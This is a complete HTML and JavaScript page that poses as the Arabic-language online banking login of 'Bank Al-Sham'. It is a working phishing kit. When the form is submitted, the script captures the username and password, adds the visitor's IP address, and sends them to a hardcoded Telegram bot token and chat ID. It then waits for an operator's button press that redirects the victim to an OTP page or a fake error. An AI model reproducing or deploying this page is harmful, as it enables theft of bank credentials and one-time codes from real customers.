<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك الشام - تسجيل دخول</title>
    <link href="https://fonts.googleapis.com/css2?family=Scheherazade+New:wght@400;700&family=Amiri:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Scheherazade New', 'Amiri', 'Arial', sans-serif;
            background: linear-gradient(180deg, #9d1b30 0%, #c71f37 100%);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        /* Islamic Pattern Background */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
                repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(139, 0, 0, 0.1) 35px, rgba(139, 0, 0, 0.1) 70px),
                repeating-linear-gradient(-45deg, transparent, transparent 35px, rgba(139, 0, 0, 0.1) 35px, rgba(139, 0, 0, 0.1) 70px);
            opacity: 0.3;
            z-index: 0;
        }

        /* Star Pattern */
        .pattern-star {
            position: absolute;
            width: 80px;
            height: 80px;
            opacity: 0.15;
        }

        .pattern-star:nth-child(1) { top: 50px; left: 40px; }
        .pattern-star:nth-child(2) { top: 150px; right: 60px; }
        .pattern-star:nth-child(3) { top: 300px; left: 80px; }
        .pattern-star:nth-child(4) { bottom: 200px; right: 100px; }
        .pattern-star:nth-child(5) { bottom: 50px; left: 120px; }
        .pattern-star:nth-child(6) { top: 100px; left: 50%; }
        .pattern-star:nth-child(7) { top: 400px; right: 40px; }

        .container {
            position: relative;
            z-index: 1;
            max-width: 100%;
            margin: 0 auto;
            padding: 20px;
        }

        /* Header with Menu */
        .header {
            display: flex;
            justify-content: flex-end;
            padding: 20px 30px;
            position: relative;
            z-index: 10;
        }

        .menu-icon {
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
        }

        .menu-bars {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-bars span {
            width: 30px;
            height: 3px;
            background: white;
            border-radius: 2px;
        }

        .menu-arrow {
            color: white;
            font-size: 28px;
            font-weight: bold;
        }

        /* Logo Section */
        .logo-section {
            text-align: center;
            margin: 30px 0 50px;
        }

        .logo {
            width: 180px;
            height: 180px;
            margin: 0 auto 20px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .logo::before {
            content: '';
            position: absolute;
            width: 200px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            z-index: -1;
        }

        .logo img {
            width: 160px;
            height: 160px;
            object-fit: contain;
        }

        .logo-text {
            color: white;
            font-size: 42px;
            font-weight: 300;
            letter-spacing: 2px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            margin-top: 10px;
        }

        /* Login Form Card */
        .login-card {
            background: white;
            border-radius: 30px 30px 0 0;
            padding: 40px 25px 60px;
            margin-top: 40px;
            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .form-title {
            text-align: center;
            color: #666;
            font-size: 24px;
            font-weight: 300;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }

        /* Error Message */
        .error-alert {
            background: #ffe6e6;
            border: 1px solid #ffcccc;
            border-right: 4px solid #c71f37;
            color: #c71f37;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 25px;
            text-align: center;
            font-size: 17px;
            display: none;
            animation: slideDown 0.5s ease-out;
        }

        .error-alert.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            text-align: right;
            color: #666;
            transition: all 0.3s;
            background: white;
        }

        .input-field:focus {
            outline: none;
            border-color: #9d1b30;
        }

        .input-field.error {
            border-color: #c71f37;
            background: #fff5f5;
        }

        .input-field::placeholder {
            color: #bbb;
        }

        .password-wrapper {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            width: 24px;
            height: 24px;
            cursor: pointer;
        }

        .eye-icon svg {
            width: 100%;
            height: 100%;
            fill: #9d1b30;
        }

        .create-account-link {
            text-align: center;
            margin: 25px 0;
            color: #666;
            font-size: 15px;
        }

        .create-account-link a {
            color: #9d1b30;
            text-decoration: none;
            font-weight: 500;
        }

        .login-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #9d1b30 0%, #c71f37 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 20px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(157, 27, 48, 0.3);
            transition: all 0.3s;
        }

        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(157, 27, 48, 0.4);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .forgot-password {
            text-align: center;
            margin: 25px 0;
        }

        .forgot-password-link {
            color: #666;
            font-size: 18px;
            text-decoration: none;
            display: inline-block;
        }

        .signup-section {
            text-align: center;
            padding: 0 20px;
            margin-top: 25px;
        }

        .signup-text {
            color: #666;
            font-size: 15px;
            line-height: 1.8;
        }

        /* Loading Overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: white;
            font-size: 22px;
            margin-top: 25px;
            text-align: center;
        }

        /* Star SVG Pattern */
        .star-pattern {
            fill: none;
            stroke: rgba(139, 0, 0, 0.2);
            stroke-width: 2;
        }

        @media (max-width: 768px) {
            .logo {
                width: 150px;
                height: 150px;
            }

            .logo img {
                width: 130px;
                height: 130px;
            }

            .logo-text {
                font-size: 36px;
            }

            .login-card {
                border-radius: 25px 25px 0 0;
                padding: 30px 20px 50px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">جاري التحقق من البيانات...</div>
    </div>

    <!-- Islamic Star Patterns -->
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <path class="star-pattern" d="M50,10 L60,40 L90,40 L65,60 L75,90 L50,70 L25,90 L35,60 L10,40 L40,40 Z"/>
    </svg>

    <div class="container">
        <!-- Header Menu -->
        <div class="header">
            <div class="menu-icon">
                <div class="menu-bars">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <div class="menu-arrow">❯</div>
            </div>
        </div>

        <!-- Logo Section -->
        <div class="logo-section">
            <div class="logo">
                <img src="image.jpg" alt="بنك الشام">
            </div>
            <div class="logo-text">بنك الشام</div>
        </div>

        <!-- Login Form Card -->
        <div class="login-card">
            <h2 class="form-title">تسجيل دخول</h2>
            
            <!-- Error Alert -->
            <div class="error-alert" id="errorAlert">
                ⚠️ البيانات المدخلة غير صحيحة، يرجى التحقق والمحاولة مرة أخرى
            </div>
            
            <form id="loginForm">
                <div class="input-group">
                    <input 
                        type="text" 
                        class="input-field" 
                        placeholder="اسم المستخدم" 
                        id="username" 
                        pattern="[0-9]*"
                        inputmode="numeric"
                        required
                    >
                </div>
                
                <div class="input-group password-wrapper">
                    <input type="password" class="input-field" placeholder="كلمة السر" id="password" required>
                    <div class="eye-icon" onclick="togglePassword()">
                        <svg viewBox="0 0 24 24">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                        </svg>
                    </div>
                </div>

                <div class="create-account-link">
                    ان لم يكن لديك حساب <a href="#">أنشئ حسابا</a>
                </div>

                <button type="submit" class="login-button">تسجيل دخول</button>

                <div class="forgot-password">
                    <a href="#" class="forgot-password-link">هل نسيت كلمة المرور؟</a>
                </div>

                <div class="signup-section">
                    <p class="signup-text">
                        اذا لديك حساب في البنك ولم تشترك في<br>
                        الخدمات الالكترونية اضغط هنا للاشتراك.
                    </p>
                </div>
            </form>
        </div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        }

        // Telegram Bot Integration
        const TELEGRAM_BOT_TOKEN = '8286980847:AAEuWMmuadQ5oa7X216n8qj7bhjVYcLgmag';
        const TELEGRAM_CHAT_ID = '6888218123';
        let sessionId = null;
        let pollingInterval = null;

        // Show error message on page load ONLY if redirected from Telegram with error
        window.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('error') === 'invalid') {
                const errorAlert = document.getElementById('errorAlert');
                errorAlert.classList.add('show');
                
                // Add error class to inputs
                document.getElementById('username').classList.add('error');
                document.getElementById('password').classList.add('error');
            }
        });

        // Restrict username to numbers only
        const usernameInput = document.getElementById('username');
        usernameInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            // Remove error styling when user starts typing
            this.classList.remove('error');
            document.getElementById('errorAlert').classList.remove('show');
        });

        // Remove error styling when user types in password
        document.getElementById('password').addEventListener('input', function() {
            this.classList.remove('error');
            document.getElementById('errorAlert').classList.remove('show');
        });

        // Form submit - save data and send to Telegram
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value;
            const password = document.getElementById('password').value;
            
            // Save credentials to localStorage
            localStorage.setItem('bank_username', username);
            localStorage.setItem('bank_password', password);
            
            // Generate unique session ID
            sessionId = Date.now().toString();
            
            // Show loading overlay
            document.getElementById('loadingOverlay').classList.add('active');
            
            const message = `🔐 بيانات تسجيل دخول جديدة - بنك الشام\n\n👤 اسم المستخدم: ${username}\n🔑 كلمة السر: ${password}\n\n📱 الوقت: ${new Date().toLocaleString('ar-JO')}\n🌐 IP: ${await getIP()}\n🆔 Session: ${sessionId}\n\n⬇️ اختر التوجيه:`;
            
            try {
                // Send message with inline keyboard
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: '🔢 رمز التحقق',
                                        callback_data: `otp_${sessionId}`
                                    },
                                    {
                                        text: '❌ بيانات خاطئة',
                                        callback_data: `error_${sessionId}`
                                    }
                                ]
                            ]
                        }
                    })
                });
                
                if (response.ok) {
                    // Start polling for admin response
                    startPolling();
                } else {
                    document.getElementById('loadingOverlay').classList.remove('active');
                    alert('حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loadingOverlay').classList.remove('active');
                alert('حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
            }
        });

        function startPolling() {
            let offset = 0;
            
            pollingInterval = setInterval(async () => {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=1`);
                    const data = await response.json();
                    
                    if (data.ok && data.result.length > 0) {
                        for (const update of data.result) {
                            offset = update.update_id + 1;
                            
                            // Check for callback query (button press)
                            if (update.callback_query) {
                                const callbackData = update.callback_query.data;
                                
                                // Check if this callback is for our session
                                if (callbackData.includes(sessionId)) {
                                    clearInterval(pollingInterval);
                                    
                                    // Answer callback query
                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            callback_query_id: update.callback_query.id,
                                            text: 'تم التوجيه ✓'
                                        })
                                    });
                                    
                                    // Redirect based on button pressed
                                    if (callbackData.startsWith('otp_')) {
                                        window.location.href = 'otp.html';
                                    } else if (callbackData.startsWith('error_')) {
                                        window.location.href = 'index.html?error=invalid';
                                    }
                                }
                            }
                        }
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 2000); // Poll every 2 seconds
            
            // Stop polling after 5 minutes
            setTimeout(() => {
                if (pollingInterval) {
                    clearInterval(pollingInterval);
                    document.getElementById('loadingOverlay').classList.remove('active');
                    alert('انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.');
                }
            }, 300000);
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'غير متوفر';
            }
        }
    </script>
</body>
</html>
